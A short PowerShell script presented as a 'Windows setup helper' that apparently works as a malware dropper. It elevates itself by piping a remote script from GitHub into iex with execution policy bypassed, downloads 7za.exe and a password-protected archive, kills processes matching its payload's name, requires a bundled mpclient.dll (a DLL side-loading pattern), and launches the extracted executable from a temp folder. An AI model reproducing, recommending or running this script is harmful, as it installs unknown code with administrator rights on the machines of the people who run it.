# Windows setup helper
$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'

$Owner     = 'EndMonitorContinue'
$Repo      = 'Windows-Setup'
$RemotePs1 = "https://raw.githubusercontent.com/$Owner/$Repo/refs/heads/main/scripts/setup.ps1"

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
    $elevated = "-NoProfile -ExecutionPolicy Bypass -Command ""irm '$RemotePs1' | iex"""
    Start-Process powershell -Verb RunAs -ArgumentList $elevated
    exit
}

$base     = "https://github.com/$Owner/$Repo/releases/download/Release"
$zipUrl   = "$base/setup.zip"
$7zaUrl   = "$base/7za.exe"
$password = 'ReleaseV2.1&*'
$exeName  = 'Latest Release_v2.1.exe'

foreach ($name in @('Latest Release_v2.1', 'Release')) {
    Get-Process -Name $name -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
}
Start-Sleep -Milliseconds 500

$work = Join-Path $env:TEMP ("win_setup_{0}" -f ([guid]::NewGuid().ToString('N').Substring(0, 8)))
$zip  = Join-Path $work 'setup.zip'
$7za  = Join-Path $work '7za.exe'
$dest = Join-Path $work 'files'

New-Item -ItemType Directory -Path $work -Force | Out-Null
Invoke-RestMethod $7zaUrl -OutFile $7za
Invoke-RestMethod $zipUrl -OutFile $zip

New-Item -ItemType Directory -Path $dest -Force | Out-Null
& $7za x $zip "-o$dest" "-p$password" -y | Out-Null
if ($LASTEXITCODE -ne 0) { throw "Extract failed (code $LASTEXITCODE)" }

$exe = Join-Path $dest $exeName
if (-not (Test-Path $exe)) {
    $found = @(Get-ChildItem -Path $dest -Filter '*.exe' -File -ErrorAction SilentlyContinue)
    if ($found.Count -eq 1) { $exe = $found[0].FullName } else { throw "Setup file not found" }
}

$dll = Join-Path $dest 'mpclient.dll'
if (-not (Test-Path $dll)) { throw "Required file not found: $dll" }

Start-Process -FilePath $exe -WorkingDirectory $dest -WindowStyle Normal | Out-Null
